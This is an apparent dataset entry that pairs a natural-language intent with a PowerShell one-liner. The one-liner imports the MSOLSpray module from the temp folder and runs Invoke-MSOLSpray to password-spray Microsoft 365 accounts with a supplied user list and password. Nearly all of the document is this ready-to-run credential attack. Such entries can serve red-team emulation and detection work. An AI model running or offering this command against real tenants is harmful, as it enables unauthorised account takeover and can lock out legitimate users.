# Natural language intent:
# Imports a module and performs password spraying against Microsoft 365 accounts using MSOLSpray.

import-module "$env:temp\MSOLSpray.ps1" ; Invoke-MSOLSpray -UserList "${UserList}" -Password "${pwd}"
